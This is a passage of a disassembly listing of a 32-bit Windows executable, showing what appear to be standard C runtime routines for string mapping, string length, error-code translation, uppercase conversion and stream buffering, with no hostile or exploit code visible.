  40bda0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40bda3:	50                   	push   %eax
  40bda4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40bda7:	51                   	push   %ecx
  40bda8:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40bdab:	52                   	push   %edx
  40bdac:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40bdaf:	50                   	push   %eax
  40bdb0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40bdb3:	51                   	push   %ecx
  40bdb4:	8b 55 08             	mov    0x8(%ebp),%edx
  40bdb7:	52                   	push   %edx
  40bdb8:	ff 15 e0 f0 40 00    	call   *0x40f0e0
  40bdbe:	85 c0                	test   %eax,%eax
  40bdc0:	75 04                	jne    0x40bdc6
  40bdc2:	33 c0                	xor    %eax,%eax
  40bdc4:	eb 6b                	jmp    0x40be31
  40bdc6:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  40bdca:	75 2e                	jne    0x40bdfa
  40bdcc:	6a 00                	push   $0x0
  40bdce:	6a 00                	push   $0x0
  40bdd0:	6a 00                	push   $0x0
  40bdd2:	6a 00                	push   $0x0
  40bdd4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40bdd7:	50                   	push   %eax
  40bdd8:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40bddb:	51                   	push   %ecx
  40bddc:	68 20 02 00 00       	push   $0x220
  40bde1:	8b 55 20             	mov    0x20(%ebp),%edx
  40bde4:	52                   	push   %edx
  40bde5:	ff 15 78 f0 40 00    	call   *0x40f078
  40bdeb:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40bdee:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40bdf2:	75 04                	jne    0x40bdf8
  40bdf4:	33 c0                	xor    %eax,%eax
  40bdf6:	eb 39                	jmp    0x40be31
  40bdf8:	eb 30                	jmp    0x40be2a
  40bdfa:	6a 00                	push   $0x0
  40bdfc:	6a 00                	push   $0x0
  40bdfe:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40be01:	50                   	push   %eax
  40be02:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40be05:	51                   	push   %ecx
  40be06:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40be09:	52                   	push   %edx
  40be0a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40be0d:	50                   	push   %eax
  40be0e:	68 20 02 00 00       	push   $0x220
  40be13:	8b 4d 20             	mov    0x20(%ebp),%ecx
  40be16:	51                   	push   %ecx
  40be17:	ff 15 78 f0 40 00    	call   *0x40f078
  40be1d:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40be20:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40be24:	75 04                	jne    0x40be2a
  40be26:	33 c0                	xor    %eax,%eax
  40be28:	eb 07                	jmp    0x40be31
  40be2a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40be2d:	eb 02                	jmp    0x40be31
  40be2f:	33 c0                	xor    %eax,%eax
  40be31:	8d 65 c0             	lea    -0x40(%ebp),%esp
  40be34:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40be37:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40be3e:	5f                   	pop    %edi
  40be3f:	5e                   	pop    %esi
  40be40:	5b                   	pop    %ebx
  40be41:	8b e5                	mov    %ebp,%esp
  40be43:	5d                   	pop    %ebp
  40be44:	c3                   	ret
  40be45:	cc                   	int3
  40be46:	cc                   	int3
  40be47:	cc                   	int3
  40be48:	cc                   	int3
  40be49:	cc                   	int3
  40be4a:	cc                   	int3
  40be4b:	cc                   	int3
  40be4c:	cc                   	int3
  40be4d:	cc                   	int3
  40be4e:	cc                   	int3
  40be4f:	cc                   	int3
  40be50:	55                   	push   %ebp
  40be51:	8b ec                	mov    %esp,%ebp
  40be53:	83 ec 08             	sub    $0x8,%esp
  40be56:	8b 45 0c             	mov    0xc(%ebp),%eax
  40be59:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40be5c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40be5f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40be62:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40be65:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40be68:	83 e8 01             	sub    $0x1,%eax
  40be6b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40be6e:	85 d2                	test   %edx,%edx
  40be70:	74 15                	je     0x40be87
  40be72:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40be75:	0f be 11             	movsbl (%ecx),%edx
  40be78:	85 d2                	test   %edx,%edx
  40be7a:	74 0b                	je     0x40be87
  40be7c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40be7f:	83 c0 01             	add    $0x1,%eax
  40be82:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40be85:	eb db                	jmp    0x40be62
  40be87:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40be8a:	0f be 11             	movsbl (%ecx),%edx
  40be8d:	85 d2                	test   %edx,%edx
  40be8f:	75 08                	jne    0x40be99
  40be91:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40be94:	2b 45 08             	sub    0x8(%ebp),%eax
  40be97:	eb 03                	jmp    0x40be9c
  40be99:	8b 45 0c             	mov    0xc(%ebp),%eax
  40be9c:	8b e5                	mov    %ebp,%esp
  40be9e:	5d                   	pop    %ebp
  40be9f:	c3                   	ret
  40bea0:	55                   	push   %ebp
  40bea1:	8b ec                	mov    %esp,%ebp
  40bea3:	6a ff                	push   $0xffffffff
  40bea5:	68 68 fd 40 00       	push   $0x40fd68
  40beaa:	68 f8 5a 40 00       	push   $0x405af8
  40beaf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40beb5:	50                   	push   %eax
  40beb6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40bebd:	83 c4 e4             	add    $0xffffffe4,%esp
  40bec0:	53                   	push   %ebx
  40bec1:	56                   	push   %esi
  40bec2:	57                   	push   %edi
  40bec3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bec6:	83 3d 9c de 45 00 00 	cmpl   $0x0,0x45de9c
  40becd:	75 4f                	jne    0x40bf1e
  40becf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40bed2:	50                   	push   %eax
  40bed3:	6a 01                	push   $0x1
  40bed5:	68 4c fd 40 00       	push   $0x40fd4c
  40beda:	6a 01                	push   $0x1
  40bedc:	ff 15 e8 f0 40 00    	call   *0x40f0e8
  40bee2:	85 c0                	test   %eax,%eax
  40bee4:	74 0c                	je     0x40bef2
  40bee6:	c7 05 9c de 45 00 01 	movl   $0x1,0x45de9c
  40beed:	00 00 00 
  40bef0:	eb 2c                	jmp    0x40bf1e
  40bef2:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40bef5:	51                   	push   %ecx
  40bef6:	6a 01                	push   $0x1
  40bef8:	68 48 fd 40 00       	push   $0x40fd48
  40befd:	6a 01                	push   $0x1
  40beff:	6a 00                	push   $0x0
  40bf01:	ff 15 e4 f0 40 00    	call   *0x40f0e4
  40bf07:	85 c0                	test   %eax,%eax
  40bf09:	74 0c                	je     0x40bf17
  40bf0b:	c7 05 9c de 45 00 02 	movl   $0x2,0x45de9c
  40bf12:	00 00 00 
  40bf15:	eb 07                	jmp    0x40bf1e
  40bf17:	33 c0                	xor    %eax,%eax
  40bf19:	e9 2a 01 00 00       	jmp    0x40c048
  40bf1e:	83 3d 9c de 45 00 02 	cmpl   $0x2,0x45de9c
  40bf25:	75 2e                	jne    0x40bf55
  40bf27:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  40bf2b:	75 09                	jne    0x40bf36
  40bf2d:	8b 15 80 de 45 00    	mov    0x45de80,%edx
  40bf33:	89 55 1c             	mov    %edx,0x1c(%ebp)
  40bf36:	8b 45 14             	mov    0x14(%ebp),%eax
  40bf39:	50                   	push   %eax
  40bf3a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bf3d:	51                   	push   %ecx
  40bf3e:	8b 55 0c             	mov    0xc(%ebp),%edx
  40bf41:	52                   	push   %edx
  40bf42:	8b 45 08             	mov    0x8(%ebp),%eax
  40bf45:	50                   	push   %eax
  40bf46:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  40bf49:	51                   	push   %ecx
  40bf4a:	ff 15 e4 f0 40 00    	call   *0x40f0e4
  40bf50:	e9 f3 00 00 00       	jmp    0x40c048
  40bf55:	83 3d 9c de 45 00 01 	cmpl   $0x1,0x45de9c
  40bf5c:	0f 85 e4 00 00 00    	jne    0x40c046
  40bf62:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  40bf66:	75 09                	jne    0x40bf71
  40bf68:	8b 15 90 de 45 00    	mov    0x45de90,%edx
  40bf6e:	89 55 18             	mov    %edx,0x18(%ebp)
  40bf71:	6a 00                	push   $0x0
  40bf73:	6a 00                	push   $0x0
  40bf75:	8b 45 10             	mov    0x10(%ebp),%eax
  40bf78:	50                   	push   %eax
  40bf79:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40bf7c:	51                   	push   %ecx
  40bf7d:	8b 55 20             	mov    0x20(%ebp),%edx
  40bf80:	f7 da                	neg    %edx
  40bf82:	1b d2                	sbb    %edx,%edx
  40bf84:	83 e2 08             	and    $0x8,%edx
  40bf87:	83 c2 01             	add    $0x1,%edx
  40bf8a:	52                   	push   %edx
  40bf8b:	8b 45 18             	mov    0x18(%ebp),%eax
  40bf8e:	50                   	push   %eax
  40bf8f:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40bf95:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40bf98:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40bf9c:	75 07                	jne    0x40bfa5
  40bf9e:	33 c0                	xor    %eax,%eax
  40bfa0:	e9 a3 00 00 00       	jmp    0x40c048
  40bfa5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40bfac:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40bfaf:	d1 e0                	shl    $1,%eax
  40bfb1:	83 c0 03             	add    $0x3,%eax
  40bfb4:	24 fc                	and    $0xfc,%al
  40bfb6:	e8 75 ef ff ff       	call   0x40af30
  40bfbb:	89 65 d4             	mov    %esp,-0x2c(%ebp)
  40bfbe:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bfc1:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40bfc4:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40bfc7:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40bfca:	d1 e2                	shl    $1,%edx
  40bfcc:	52                   	push   %edx
  40bfcd:	6a 00                	push   $0x0
  40bfcf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40bfd2:	50                   	push   %eax
  40bfd3:	e8 28 72 ff ff       	call   0x403200
  40bfd8:	83 c4 0c             	add    $0xc,%esp
  40bfdb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bfe2:	eb 17                	jmp    0x40bffb
  40bfe4:	b8 01 00 00 00       	mov    $0x1,%eax
  40bfe9:	c3                   	ret
  40bfea:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40bfed:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40bff4:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bffb:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40bfff:	75 04                	jne    0x40c005
  40c001:	33 c0                	xor    %eax,%eax
  40c003:	eb 43                	jmp    0x40c048
  40c005:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40c008:	51                   	push   %ecx
  40c009:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40c00c:	52                   	push   %edx
  40c00d:	8b 45 10             	mov    0x10(%ebp),%eax
  40c010:	50                   	push   %eax
  40c011:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c014:	51                   	push   %ecx
  40c015:	6a 01                	push   $0x1
  40c017:	8b 55 18             	mov    0x18(%ebp),%edx
  40c01a:	52                   	push   %edx
  40c01b:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40c021:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40c024:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40c028:	75 04                	jne    0x40c02e
  40c02a:	33 c0                	xor    %eax,%eax
  40c02c:	eb 1a                	jmp    0x40c048
  40c02e:	8b 45 14             	mov    0x14(%ebp),%eax
  40c031:	50                   	push   %eax
  40c032:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40c035:	51                   	push   %ecx
  40c036:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40c039:	52                   	push   %edx
  40c03a:	8b 45 08             	mov    0x8(%ebp),%eax
  40c03d:	50                   	push   %eax
  40c03e:	ff 15 e8 f0 40 00    	call   *0x40f0e8
  40c044:	eb 02                	jmp    0x40c048
  40c046:	33 c0                	xor    %eax,%eax
  40c048:	8d 65 c8             	lea    -0x38(%ebp),%esp
  40c04b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c04e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40c055:	5f                   	pop    %edi
  40c056:	5e                   	pop    %esi
  40c057:	5b                   	pop    %ebx
  40c058:	8b e5                	mov    %ebp,%esp
  40c05a:	5d                   	pop    %ebp
  40c05b:	c3                   	ret
  40c05c:	cc                   	int3
  40c05d:	cc                   	int3
  40c05e:	cc                   	int3
  40c05f:	cc                   	int3
  40c060:	55                   	push   %ebp
  40c061:	8b ec                	mov    %esp,%ebp
  40c063:	51                   	push   %ecx
  40c064:	e8 a7 00 00 00       	call   0x40c110
  40c069:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c06c:	89 08                	mov    %ecx,(%eax)
  40c06e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40c075:	eb 09                	jmp    0x40c080
  40c077:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c07a:	83 c2 01             	add    $0x1,%edx
  40c07d:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40c080:	83 7d fc 2d          	cmpl   $0x2d,-0x4(%ebp)
  40c084:	73 24                	jae    0x40c0aa
  40c086:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c089:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c08c:	3b 0c c5 20 d5 45 00 	cmp    0x45d520(,%eax,8),%ecx
  40c093:	75 13                	jne    0x40c0a8
  40c095:	e8 66 00 00 00       	call   0x40c100
  40c09a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c09d:	8b 0c d5 24 d5 45 00 	mov    0x45d524(,%edx,8),%ecx
  40c0a4:	89 08                	mov    %ecx,(%eax)
  40c0a6:	eb 45                	jmp    0x40c0ed
  40c0a8:	eb cd                	jmp    0x40c077
  40c0aa:	83 7d 08 13          	cmpl   $0x13,0x8(%ebp)
  40c0ae:	72 13                	jb     0x40c0c3
  40c0b0:	83 7d 08 24          	cmpl   $0x24,0x8(%ebp)
  40c0b4:	77 0d                	ja     0x40c0c3
  40c0b6:	e8 45 00 00 00       	call   0x40c100
  40c0bb:	c7 00 0d 00 00 00    	movl   $0xd,(%eax)
  40c0c1:	eb 2a                	jmp    0x40c0ed
  40c0c3:	81 7d 08 bc 00 00 00 	cmpl   $0xbc,0x8(%ebp)
  40c0ca:	72 16                	jb     0x40c0e2
  40c0cc:	81 7d 08 ca 00 00 00 	cmpl   $0xca,0x8(%ebp)
  40c0d3:	77 0d                	ja     0x40c0e2
  40c0d5:	e8 26 00 00 00       	call   0x40c100
  40c0da:	c7 00 08 00 00 00    	movl   $0x8,(%eax)
  40c0e0:	eb 0b                	jmp    0x40c0ed
  40c0e2:	e8 19 00 00 00       	call   0x40c100
  40c0e7:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40c0ed:	8b e5                	mov    %ebp,%esp
  40c0ef:	5d                   	pop    %ebp
  40c0f0:	c3                   	ret
  40c0f1:	cc                   	int3
  40c0f2:	cc                   	int3
  40c0f3:	cc                   	int3
  40c0f4:	cc                   	int3
  40c0f5:	cc                   	int3
  40c0f6:	cc                   	int3
  40c0f7:	cc                   	int3
  40c0f8:	cc                   	int3
  40c0f9:	cc                   	int3
  40c0fa:	cc                   	int3
  40c0fb:	cc                   	int3
  40c0fc:	cc                   	int3
  40c0fd:	cc                   	int3
  40c0fe:	cc                   	int3
  40c0ff:	cc                   	int3
  40c100:	55                   	push   %ebp
  40c101:	8b ec                	mov    %esp,%ebp
  40c103:	e8 18 84 ff ff       	call   0x404520
  40c108:	83 c0 08             	add    $0x8,%eax
  40c10b:	5d                   	pop    %ebp
  40c10c:	c3                   	ret
  40c10d:	cc                   	int3
  40c10e:	cc                   	int3
  40c10f:	cc                   	int3
  40c110:	55                   	push   %ebp
  40c111:	8b ec                	mov    %esp,%ebp
  40c113:	e8 08 84 ff ff       	call   0x404520
  40c118:	83 c0 0c             	add    $0xc,%eax
  40c11b:	5d                   	pop    %ebp
  40c11c:	c3                   	ret
  40c11d:	cc                   	int3
  40c11e:	cc                   	int3
  40c11f:	cc                   	int3
  40c120:	55                   	push   %ebp
  40c121:	8b ec                	mov    %esp,%ebp
  40c123:	51                   	push   %ecx
  40c124:	83 3d 80 de 45 00 00 	cmpl   $0x0,0x45de80
  40c12b:	75 1a                	jne    0x40c147
  40c12d:	83 7d 08 61          	cmpl   $0x61,0x8(%ebp)
  40c131:	7c 0f                	jl     0x40c142
  40c133:	83 7d 08 7a          	cmpl   $0x7a,0x8(%ebp)
  40c137:	7f 09                	jg     0x40c142
  40c139:	8b 45 08             	mov    0x8(%ebp),%eax
  40c13c:	83 e8 20             	sub    $0x20,%eax
  40c13f:	89 45 08             	mov    %eax,0x8(%ebp)
  40c142:	8b 45 08             	mov    0x8(%ebp),%eax
  40c145:	eb 68                	jmp    0x40c1af
  40c147:	68 08 f0 45 00       	push   $0x45f008
  40c14c:	ff 15 c4 f0 40 00    	call   *0x40f0c4
  40c152:	83 3d 04 f0 45 00 00 	cmpl   $0x0,0x45f004
  40c159:	74 1e                	je     0x40c179
  40c15b:	68 08 f0 45 00       	push   $0x45f008
  40c160:	ff 15 bc f0 40 00    	call   *0x40f0bc
  40c166:	6a 13                	push   $0x13
  40c168:	e8 03 73 ff ff       	call   0x403470
  40c16d:	83 c4 04             	add    $0x4,%esp
  40c170:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40c177:	eb 07                	jmp    0x40c180
  40c179:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40c180:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c183:	51                   	push   %ecx
  40c184:	e8 37 00 00 00       	call   0x40c1c0
  40c189:	83 c4 04             	add    $0x4,%esp
  40c18c:	89 45 08             	mov    %eax,0x8(%ebp)
  40c18f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40c193:	74 0c                	je     0x40c1a1
  40c195:	6a 13                	push   $0x13
  40c197:	e8 74 73 ff ff       	call   0x403510
  40c19c:	83 c4 04             	add    $0x4,%esp
  40c19f:	eb 0b                	jmp    0x40c1ac
  40c1a1:	68 08 f0 45 00       	push   $0x45f008
  40c1a6:	ff 15 bc f0 40 00    	call   *0x40f0bc
  40c1ac:	8b 45 08             	mov    0x8(%ebp),%eax
  40c1af:	8b e5                	mov    %ebp,%esp
  40c1b1:	5d                   	pop    %ebp
  40c1b2:	c3                   	ret
  40c1b3:	cc                   	int3
  40c1b4:	cc                   	int3
  40c1b5:	cc                   	int3
  40c1b6:	cc                   	int3
  40c1b7:	cc                   	int3
  40c1b8:	cc                   	int3
  40c1b9:	cc                   	int3
  40c1ba:	cc                   	int3
  40c1bb:	cc                   	int3
  40c1bc:	cc                   	int3
  40c1bd:	cc                   	int3
  40c1be:	cc                   	int3
  40c1bf:	cc                   	int3
  40c1c0:	55                   	push   %ebp
  40c1c1:	8b ec                	mov    %esp,%ebp
  40c1c3:	83 ec 10             	sub    $0x10,%esp
  40c1c6:	83 3d 80 de 45 00 00 	cmpl   $0x0,0x45de80
  40c1cd:	75 1d                	jne    0x40c1ec
  40c1cf:	83 7d 08 61          	cmpl   $0x61,0x8(%ebp)
  40c1d3:	7c 0f                	jl     0x40c1e4
  40c1d5:	83 7d 08 7a          	cmpl   $0x7a,0x8(%ebp)
  40c1d9:	7f 09                	jg     0x40c1e4
  40c1db:	8b 45 08             	mov    0x8(%ebp),%eax
  40c1de:	83 e8 20             	sub    $0x20,%eax
  40c1e1:	89 45 08             	mov    %eax,0x8(%ebp)
  40c1e4:	8b 45 08             	mov    0x8(%ebp),%eax
  40c1e7:	e9 fb 00 00 00       	jmp    0x40c2e7
  40c1ec:	81 7d 08 00 01 00 00 	cmpl   $0x100,0x8(%ebp)
  40c1f3:	7d 3e                	jge    0x40c233
  40c1f5:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  40c1fc:	7e 13                	jle    0x40c211
  40c1fe:	6a 02                	push   $0x2
  40c200:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c203:	51                   	push   %ecx
  40c204:	e8 b7 f2 ff ff       	call   0x40b4c0
  40c209:	83 c4 08             	add    $0x8,%esp
  40c20c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40c20f:	eb 14                	jmp    0x40c225
  40c211:	8b 55 08             	mov    0x8(%ebp),%edx
  40c214:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40c219:	33 c9                	xor    %ecx,%ecx
  40c21b:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40c21f:	83 e1 02             	and    $0x2,%ecx
  40c222:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40c225:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40c229:	75 08                	jne    0x40c233
  40c22b:	8b 45 08             	mov    0x8(%ebp),%eax
  40c22e:	e9 b4 00 00 00       	jmp    0x40c2e7
  40c233:	8b 55 08             	mov    0x8(%ebp),%edx
  40c236:	c1 fa 08             	sar    $0x8,%edx
  40c239:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40c23f:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40c245:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40c24a:	33 c9                	xor    %ecx,%ecx
  40c24c:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40c250:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40c256:	85 c9                	test   %ecx,%ecx
  40c258:	74 22                	je     0x40c27c
  40c25a:	8b 55 08             	mov    0x8(%ebp),%edx
  40c25d:	c1 fa 08             	sar    $0x8,%edx
  40c260:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40c266:	88 55 f8             	mov    %dl,-0x8(%ebp)
  40c269:	8a 45 08             	mov    0x8(%ebp),%al
  40c26c:	88 45 f9             	mov    %al,-0x7(%ebp)
  40c26f:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  40c273:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40c27a:	eb 11                	jmp    0x40c28d
  40c27c:	8a 4d 08             	mov    0x8(%ebp),%cl
  40c27f:	88 4d f8             	mov    %cl,-0x8(%ebp)
  40c282:	c6 45 f9 00          	movb   $0x0,-0x7(%ebp)
  40c286:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40c28d:	6a 01                	push   $0x1
  40c28f:	6a 00                	push   $0x0
  40c291:	6a 03                	push   $0x3
  40c293:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40c296:	52                   	push   %edx
  40c297:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c29a:	50                   	push   %eax
  40c29b:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40c29e:	51                   	push   %ecx
  40c29f:	68 00 02 00 00       	push   $0x200
  40c2a4:	8b 15 80 de 45 00    	mov    0x45de80,%edx
  40c2aa:	52                   	push   %edx
  40c2ab:	e8 90 f8 ff ff       	call   0x40bb40
  40c2b0:	83 c4 20             	add    $0x20,%esp
  40c2b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c2b6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40c2ba:	75 05                	jne    0x40c2c1
  40c2bc:	8b 45 08             	mov    0x8(%ebp),%eax
  40c2bf:	eb 26                	jmp    0x40c2e7
  40c2c1:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  40c2c5:	75 0a                	jne    0x40c2d1
  40c2c7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40c2ca:	25 ff 00 00 00       	and    $0xff,%eax
  40c2cf:	eb 16                	jmp    0x40c2e7
  40c2d1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40c2d4:	25 ff 00 00 00       	and    $0xff,%eax
  40c2d9:	8b 4d f5             	mov    -0xb(%ebp),%ecx
  40c2dc:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40c2e2:	c1 e1 08             	shl    $0x8,%ecx
  40c2e5:	0b c1                	or     %ecx,%eax
  40c2e7:	8b e5                	mov    %ebp,%esp
  40c2e9:	5d                   	pop    %ebp
  40c2ea:	c3                   	ret
  40c2eb:	cc                   	int3
  40c2ec:	cc                   	int3
  40c2ed:	cc                   	int3
  40c2ee:	cc                   	int3
  40c2ef:	cc                   	int3
  40c2f0:	55                   	push   %ebp
  40c2f1:	8b ec                	mov    %esp,%ebp
  40c2f3:	83 ec 14             	sub    $0x14,%esp
  40c2f6:	53                   	push   %ebx
  40c2f7:	56                   	push   %esi
  40c2f8:	57                   	push   %edi
  40c2f9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40c2fd:	75 1e                	jne    0x40c31d
  40c2ff:	68 c0 fd 40 00       	push   $0x40fdc0
  40c304:	6a 00                	push   $0x0
  40c306:	6a 69                	push   $0x69
  40c308:	68 b4 fd 40 00       	push   $0x40fdb4
  40c30d:	6a 02                	push   $0x2
  40c30f:	e8 ac d2 ff ff       	call   0x4095c0
  40c314:	83 c4 14             	add    $0x14,%esp
  40c317:	83 f8 01             	cmp    $0x1,%eax
  40c31a:	75 01                	jne    0x40c31d
  40c31c:	cc                   	int3
  40c31d:	33 c0                	xor    %eax,%eax
  40c31f:	85 c0                	test   %eax,%eax
  40c321:	75 d6                	jne    0x40c2f9
  40c323:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c326:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40c329:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c32c:	8b 42 10             	mov    0x10(%edx),%eax
  40c32f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40c332:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c335:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c338:	81 e2 82 00 00 00    	and    $0x82,%edx
  40c33e:	85 d2                	test   %edx,%edx
  40c340:	74 0d                	je     0x40c34f
  40c342:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c345:	8b 48 0c             	mov    0xc(%eax),%ecx
  40c348:	83 e1 40             	and    $0x40,%ecx
  40c34b:	85 c9                	test   %ecx,%ecx
  40c34d:	74 16                	je     0x40c365
  40c34f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c352:	8b 42 0c             	mov    0xc(%edx),%eax
  40c355:	0c 20                	or     $0x20,%al
  40c357:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c35a:	89 41 0c             	mov    %eax,0xc(%ecx)
  40c35d:	83 c8 ff             	or     $0xffffffff,%eax
  40c360:	e9 f8 01 00 00       	jmp    0x40c55d
  40c365:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c368:	8b 42 0c             	mov    0xc(%edx),%eax
  40c36b:	83 e0 01             	and    $0x1,%eax
  40c36e:	85 c0                	test   %eax,%eax
  40c370:	74 4a                	je     0x40c3bc
  40c372:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c375:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40c37c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c37f:	8b 42 0c             	mov    0xc(%edx),%eax
  40c382:	83 e0 10             	and    $0x10,%eax
  40c385:	85 c0                	test   %eax,%eax
  40c387:	74 1c                	je     0x40c3a5
  40c389:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c38c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c38f:	8b 42 08             	mov    0x8(%edx),%eax
  40c392:	89 01                	mov    %eax,(%ecx)
  40c394:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c397:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c39a:	83 e2 fe             	and    $0xfffffffe,%edx
  40c39d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c3a0:	89 50 0c             	mov    %edx,0xc(%eax)
  40c3a3:	eb 17                	jmp    0x40c3bc
  40c3a5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c3a8:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c3ab:	83 ca 20             	or     $0x20,%edx
  40c3ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c3b1:	89 50 0c             	mov    %edx,0xc(%eax)
  40c3b4:	83 c8 ff             	or     $0xffffffff,%eax
  40c3b7:	e9 a1 01 00 00       	jmp    0x40c55d
  40c3bc:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c3bf:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c3c2:	83 ca 02             	or     $0x2,%edx
  40c3c5:	8b 45 f8             	mov    -0x8(%ebp),%eax
